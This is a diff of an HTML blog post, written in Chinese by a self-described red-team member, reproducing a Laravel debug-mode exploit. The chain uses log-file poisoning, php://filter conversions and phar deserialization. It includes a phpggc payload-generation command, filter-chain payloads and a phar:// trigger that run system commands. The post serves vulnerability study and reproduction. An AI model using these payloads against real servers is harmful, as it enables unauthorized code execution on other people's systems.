@@ -107,7 +107,7 @@ cp <span class="hljs-class">.env</span><span class="hljs-class">.example</span> 
 									
 								</div>
 								
-								<p>&nbsp;&nbsp;&nbsp;再到config/app.php中开启debug模式。至于APP_KEY的话，访问一下主页在报错中点击生成key按钮就行了。</p>
+								<p>&nbsp;&nbsp;&nbsp;到.env中开启debug模式。至于APP_KEY的话，访问一下主页，按报错中的说明执行指令或者点击生成key按钮就行了。</p>
 								
 								<a href="#">
                     <img class="img-fluid" src="../img/2021-7-12/install.jpg" alt="">
@@ -196,6 +196,8 @@ cp <span class="hljs-class">.env</span><span class="hljs-class">.example</span> 
                 	<pre class='hljs'><code>php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=consumed/resource=../storage/logs/laravel.<span class="hljs-built_in">log</span></code></pre>
                 	
                 </div>
+                
+                
                 	
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-7-12/pop-10.jpg" alt="">
@@ -208,12 +210,12 @@ cp <span class="hljs-class">.env</span><span class="hljs-class">.example</span> 
                 </a>
                 
                 <p>&nbsp;&nbsp;&nbsp;接下来便是如何通过编解码来构造phar文件，看一下payload怎么生成。
-                	首先利用phpggc生成一个payload，然后进行base64编码，最后进行quoted-printable编码。
+                	首先利用phpggc生成一个payload，然后进行base64编码，最后进行quoted-printable编码(将每个字节的十六进制数前加一个=)。
                 	之所以要进行quoted-printable编码，是因为空字节会导致函数报错，所以要对这个空字节进行填充编码为两字节。</p>
                 <p>&nbsp;&nbsp;&nbsp;这样一来，先经过一次quoted-printable解码，
                 	再经过一次utf-16转utf-8后，无用字符就会变成非ascii码字符，然后再经过一次base64解码后，
-                	就只剩下构造的payload。这里不直接base64位去掉无用字符的原因是，报错信息中也含有=字符，可能会导致错误。
-                	这里记得在末尾加上个a，原因是UTF-16是基于两字节，这样可以确保前后两段payload至少有一个解码成功，
+                	就只剩下构造的payload。这里不直接base64位去掉无用字符的原因是，报错信息中也含有=字符，可能会导致错误。</p>
+                <p>&nbsp;&nbsp;&nbsp;还有一个很重要的点就是，记得在末尾加上个a。原因是UTF-16是基于两字节，这样可以确保前后两段payload至少有一个解码成功，
                 	也防止了重复payload。</p>
                 	
                 <div>
@@ -221,25 +223,69 @@ cp <span class="hljs-class">.env</span><span class="hljs-class">.example</span> 
                 	<pre class='hljs'><code>php -d <span class="hljs-string">'phar.readonly=0'</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 system id --phar phar -o <span class="hljs-string">php:</span><span class="hljs-comment">//output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" &gt; payload.txt</span></code></pre>
                 	
                 </div>
+                
                 	
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-7-12/pop-12.jpg" alt="">
                 </a>
                 
-                <p>&nbsp;&nbsp;&nbsp;但上述条件都是建立在错误日志能够将payload凑成两字节的情况下，
+                <p>&nbsp;&nbsp;&nbsp;但上述条件都是建立在错误日志能够将payload中的每两字节按顺序转化，
                 	所以需要先发送一个凑齐两字节的payload。</p>
+                	
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-12/pop-16.jpg" alt="">
+                </a>	
                 
+                <p>&nbsp;&nbsp;&nbsp;接着，将刚刚phpggc生成后的payload打过去，这里要记得在后缀上上a。</p>
 
+                	       
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-12/pop-14.jpg" alt="">
+                </a>	
                 
-
-
-
-
-
-
-
-
-
+                <p>&nbsp;&nbsp;&nbsp;接着，利用上面所说的伪协议将日志变为phar文件。这里响应包状态码应该是200才算成功。
+                	然后，再利用phar协议反序列化攻击即可。至于我图中复现为什么状态码是500(失败了)，下面会提到(环境的问题)。</p>
+                
+                <div>
+                
+                <pre class='hljs'><code>php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-built_in">convert</span>.quoted-printable-decode|<span class="hljs-built_in">convert</span>.iconv.utf-<span class="hljs-number">16</span>le.utf-<span class="hljs-number">8</span>|<span class="hljs-built_in">convert</span>.base64-decode/resource=../storage/logs/laravel.<span class="hljs-built_in">log</span></code></pre>
+                	
+                </div>
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-12/pop-13.jpg" alt="">
+                </a>	
+                	
+								<p>&nbsp;&nbsp;&nbsp;这个payload做了各种调整测试，从早上干到了晚上，做了各种尝试与验证，依旧是上图中那个报错信息。
+									作为一名红队成员，当然不能就此打住(我已经对这种感觉麻木了)。</p>
+								<p>&nbsp;&nbsp;&nbsp;果然，功夫不负有心人，我开始考虑PHP版本的问题，
+									存了个镜像马上到vps上搭环境，换了个PHP 7.3。啪地一些很快啊，200状态码就出来了。
+									因为我物理机的PHP版本是7.4.2，结合报错信息来看，我猜测是convert.iconv过滤器与PHP的版本有关系。</p>
+									
+								<a href="#">
+                    <img class="img-fluid" src="../img/2021-7-12/pop-17.jpg" alt="">
+                </a>		
+                
+                <p>&nbsp;&nbsp;&nbsp;登上vps看了下内容，果然是phar文件。</p>
+                
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-12/pop-18.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;最后一步phar协议一打，成功完成反序列化攻击，页面回显内容。</p>
+                
+                <div>
+                	
+                <pre class='hljs'><code><span class="hljs-symbol">phar:</span>/<span class="hljs-regexp">/../storage</span><span class="hljs-regexp">/logs/laravel</span>.log/test.txt</code></pre>	
+                	
+                </div>	 
+                
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-12/pop-19.jpg" alt="">
+                </a>		
+                	
+           
            
                 <h2 class="section-heading">There Is Nothing Below</h2>
                 <p>&nbsp;&nbsp;&nbsp;</p>
